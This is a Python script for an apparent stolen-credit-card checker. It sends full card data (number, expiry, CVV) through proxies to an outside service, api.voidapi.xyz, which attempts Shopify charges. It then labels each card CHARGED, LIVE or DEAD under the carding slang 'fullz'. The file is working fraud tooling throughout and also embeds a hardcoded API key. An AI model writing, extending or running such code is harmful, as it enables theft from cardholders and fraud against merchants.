import httpx

async def sl_charge_func(fullcc, site_url, proxy=None, session=None, user_id=None):
    try:
        cc, mes, ano, cvv = fullcc.strip().split("|")
        url = "https://api.voidapi.xyz/v2/shopify_graphql"

        payload = {
            "key": "VDX-SHA2X-NZ0RS-O7HAM",
            "data": {
                "card": fullcc,
                "product_url": site_url,
                "email": f"user{user_id}@gmail.com" if user_id else None,
                "proxy": proxy,
                "ship_address": None,
                "is_shippable": False
            }
        }

        res = await session.post(url, json=payload)
        return res.json()

    except Exception as e:
        return {"status": "error", "error": str(e)}



async def get_charge_resp(response, user_id, fullcc):
    try:
        status = (response.get("status") or "").lower()
        msg = response.get("message") or ""
        err = response.get("error") or ""

        if status == "processedreceipt":
            return {
                "hits": "CHARGED",
                "fullz": fullcc,
                "response": msg.upper() or "CHARGED SUCCESSFULLY"
            }

        elif status == "live":
            return {
                "hits": "LIVE",
                "fullz": fullcc,
                "response": msg.upper() or "CARD IS LIVE"
            }

        if err.strip().upper() == "ERROR" or (not err and not msg):
            return {
                "hits": "DEAD",
                "fullz": fullcc,
                "response": status.upper() or "DECLINED"
            }
        else:
            return {
                "hits": "DEAD",
                "fullz": fullcc,
                "response": (err or msg).upper()
            }

    except Exception as e:
        return {
            "hits": "DEAD",
            "fullz": fullcc,
            "response": f"EXCEPTION: {str(e).upper()}"
        }
